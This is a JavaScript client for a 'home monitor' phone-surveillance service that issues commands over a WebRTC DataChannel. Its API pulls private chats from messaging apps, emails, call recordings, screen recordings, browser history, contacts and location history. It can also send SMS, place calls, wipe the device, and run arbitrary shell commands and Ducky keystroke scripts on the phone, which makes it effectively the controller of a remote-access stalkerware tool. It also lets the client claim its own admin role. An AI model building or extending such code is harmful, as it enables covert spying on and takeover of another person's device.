// homemonitor-api-client.js - Centralized Browser REST-like WebRTC API Client

class HomeMonitorApiClient {
    constructor() {
        this.pendingRequests = new Map(); // requestId -> { resolve, reject, timer, method }
        this.topicSubscriptions = new Map(); // topic -> Set(callback)
    }

    /**
     * Sends a versioned JSON API request over WebRTC DataChannel
     */
    request(method, params = {}, options = {}) {
        return new Promise((resolve, reject) => {
            if (typeof dc === "undefined" || !dc || dc.readyState !== "open") {
                console.warn(`[HomeMonitorAPI] Request failed: DataChannel is not OPEN for method '${method}'`);
                reject(new Error(`P2P DataChannel is not connected. Operation '${method}' requires direct P2P connection.`));
                return;
            }

            const buffered = dc.bufferedAmount || 0;
            if (buffered > 131072) {
                console.warn(`[HomeMonitorAPI] Backpressure threshold exceeded (${buffered} bytes). Dropping request '${method}'.`);
                reject(new Error(`DataChannel backpressure high (${buffered} bytes). Please retry shortly.`));
                return;
            }

            const requestId = "req_" + Date.now() + "_" + Math.floor(Math.random() * 10000);
            const timeoutMs = options.timeoutMs || 15000;
            const currentSessionId = typeof activeSessionId !== "undefined" ? activeSessionId : "sess_default";
            const userRole = (typeof isMasterAdmin !== "undefined" && isMasterAdmin) ? "SUPER_ADMIN" : "PARENT";

            const envelope = {
                version: 1,
                type: "REQUEST",
                requestId: requestId,
                sessionId: currentSessionId,
                method: method,
                params: params || {},
                role: userRole,
                timestamp: Date.now(),
                ttlMs: timeoutMs,
                deadline: Date.now() + timeoutMs
            };

            const timer = setTimeout(() => {
                if (this.pendingRequests.has(requestId)) {
                    this.pendingRequests.delete(requestId);
                    reject(new Error(`P2P Request Timeout for method '${method}' (${timeoutMs / 1000}s)`));
                }
            }, timeoutMs);

            this.pendingRequests.set(requestId, { resolve, reject, timer, method });

            try {
                dc.send(JSON.stringify(envelope));
                console.log(`[HomeMonitorAPI Transmit] ${method} (${requestId})`, params);
            } catch (e) {
                clearTimeout(timer);
                this.pendingRequests.delete(requestId);
                reject(e);
            }
        });
    }

    /**
     * Handles incoming DataChannel response or event envelope
     */
    handleIncomingEnvelope(envelope) {
        if (!envelope || typeof envelope !== "object") return;

        const type = envelope.type || "";

        if (type === "RESPONSE") {
            const reqId = envelope.requestId;
            if (this.pendingRequests.has(reqId)) {
                const { resolve, reject, timer, method } = this.pendingRequests.get(reqId);
                clearTimeout(timer);
                this.pendingRequests.delete(reqId);

                if (envelope.success) {
                    console.log(`[HomeMonitorAPI Response Success] ${method} (${reqId})`, envelope.data);
                    resolve(envelope.data);
                } else {
                    const errMsg = envelope.error || `Operation '${method}' failed on target device.`;
                    console.warn(`[HomeMonitorAPI Response Error] ${method} (${reqId}):`, errMsg);
                    reject(new Error(errMsg));
                }
            }
        } else if (type === "EVENT" && envelope.event) {
            const topic = envelope.event;
            console.log(`[HomeMonitorAPI Event] Topic '${topic}':`, envelope.data);
            if (this.topicSubscriptions.has(topic)) {
                const callbacks = this.topicSubscriptions.get(topic);
                callbacks.forEach(cb => {
                    try { cb(envelope.data, envelope); } catch (e) { console.error(`[HomeMonitorAPI Callback Error] '${topic}':`, e); }
                });
            }
        }
    }

    /**
     * Subscribes to a real-time event topic over DataChannel
     */
    subscribe(topic, callback) {
        if (!topic || typeof callback !== "function") return () => {};

        if (!this.topicSubscriptions.has(topic)) {
            this.topicSubscriptions.set(topic, new Set());
        }
        this.topicSubscriptions.get(topic).add(callback);

        if (typeof dc !== "undefined" && dc && dc.readyState === "open") {
            const subEnvelope = {
                version: 1,
                type: "SUBSCRIBE",
                subscriptionId: "sub_" + topic + "_" + Date.now(),
                topic: topic
            };
            try { dc.send(JSON.stringify(subEnvelope)); } catch (_) {}
        }

        return () => this.unsubscribe(topic, callback);
    }

    /**
     * Unsubscribes from a real-time event topic
     */
    unsubscribe(topic, callback) {
        if (!this.topicSubscriptions.has(topic)) return;

        if (callback) {
            this.topicSubscriptions.get(topic).delete(callback);
            if (this.topicSubscriptions.get(topic).size === 0) {
                this.topicSubscriptions.delete(topic);
            }
        } else {
            this.topicSubscriptions.delete(topic);
        }

        if (typeof dc !== "undefined" && dc && dc.readyState === "open") {
            const unsubEnvelope = {
                version: 1,
                type: "UNSUBSCRIBE",
                topic: topic
            };
            try { dc.send(JSON.stringify(unsubEnvelope)); } catch (_) {}
        }
    }

    // ── Typed API Namespaces ──

    camera = {
        takePhoto: (lens = "back") => this.request("camera.takePhoto", { lens })
    };

    contacts = {
        getList: () => this.request("contacts.getList")
    };

    apps = {
        getList: (filter = "all") => this.request("apps.getList", { filter })
    };

    browser = {
        getHistory: () => this.request("browser.getHistory")
    };

    device = {
        getSummary: () => this.request("device.getSummary"),
        getInfo: () => this.request("device.getInfo"),
        getStatus: () => this.request("device.getStatus"),
        getPermissions: () => this.request("device.getPermissions"),
        getOemAutostart: () => this.request("device.getOemAutostart")
    };

    location = {
        getCurrent: () => this.request("location.getCurrent"),
        getHistory: () => this.request("location.getHistory")
    };

    geofences = {
        list: () => this.request("geofences.list"),
        create: (name, radius) => this.request("geofences.create", { name, radius }),
        update: (name, radius) => this.request("geofences.update", { name, radius }),
        delete: (name) => this.request("geofences.delete", { name })
    };

    files = {
        list: (path) => this.request("files.list", { path }),
        delete: (path) => this.request("files.delete", { path })
    };

    chat = {
        getThreads: (app) => this.request("chat.getThreads", { app }),
        getMessages: (app, threadId) => this.request("chat.getMessages", { app, threadId }),
        sendMessage: (app, text) => this.request("chat.sendMessage", { app, text })
    };

    calls = {
        getLogs: () => this.request("calls.getLogs")
    };

    emails = {
        getList: () => this.request("emails.getList")
    };

    media = {
        getPhotos: () => this.request("media.getPhotos"),
        getVideos: () => this.request("media.getVideos"),
        getScreenrecordings: () => this.request("media.getScreenrecordings"),
        getAudio: () => this.request("media.getAudio"),
        getCallRecordings: () => this.request("media.getCallRecordings")
    };

    logs = {
        getFeed: (category) => this.request("logs.getFeed", { category })
    };

    usage = {
        getSummary: () => this.request("usage.getSummary"),
        setBlockRules: (blockedPackages) => this.request("usage.setBlockRules", { blockedPackages })
    };

    auth = {
        get2faSetup: () => this.request("auth.get2faSetup")
    };

    backup = {
        getStatus: () => this.request("archive.getStatus"),
        create: () => this.request("archive.runNow")
    };

    archive = {
        getStatus: () => this.request("archive.getStatus"),
        configure: (config) => this.request("archive.configure", config || {}),
        runNow: (overrideNetwork = false) => this.request("archive.runNow", { overrideNetwork: !!overrideNetwork }),
        linkDrive: (accountEmail, refreshToken, accessToken = null) => this.request("archive.linkDrive", { accountEmail, refreshToken, accessToken }),
        disconnectDrive: () => this.request("archive.disconnectDrive"),
        getHistoricalData: (dataset, fromTime = 0, toTime = Date.now()) => this.request("archive.getHistoricalData", { dataset, fromTime, toTime })
    };

    mdm = {
        getStatus: () => this.request("mdm.getStatus"),
        grantPermissions: () => this.request("mdm.grantPermissions"),
        setLockMessage: (message) => this.request("mdm.setLockMessage", { message }),
        setKioskMode: (enabled, packageName) => this.request("mdm.setKioskMode", { enabled, packageName }),
        setRestrictions: (enabled) => this.request("mdm.setRestrictions", { enabled }),
        wipeData: () => this.request("mdm.wipeData")
    };

    control = {
        showToast: (message) => this.request("control.showToast", { message }),
        vibrate: (durationMs = 500) => this.request("control.vibrate", { durationMs }),
        openUrl: (url) => this.request("control.openUrl", { url }),
        makeCall: (phoneNumber) => this.request("control.makeCall", { phoneNumber }),
        sendSms: (phone, message) => this.request("control.sendSms", { phone, message }),
        lockScreen: () => this.request("device.lock")
    };

    admin = {
        getGlobalFleet: () => this.request("admin.getGlobalFleet"),
        setPermissionMatrix: (matrix) => this.request("admin.setPermissionMatrix", matrix),
        setTrial: (status, message) => this.request("admin.setTrial", { status, message }),
        execShell: (command, context = "system") => this.request("shell.exec", { command, context }),
        execDucky: (scriptContent) => this.request("ducky.execute", { scriptContent })
    };

    system = {
        getAvailableCommands: () => this.request("system.getAvailableCommands")
    };
}

// Global Singleton Instance
const HomeMonitorAPI = new HomeMonitorApiClient();

if (typeof module !== "undefined" && module.exports) {
    module.exports = { HomeMonitorApiClient, HomeMonitorAPI };
}
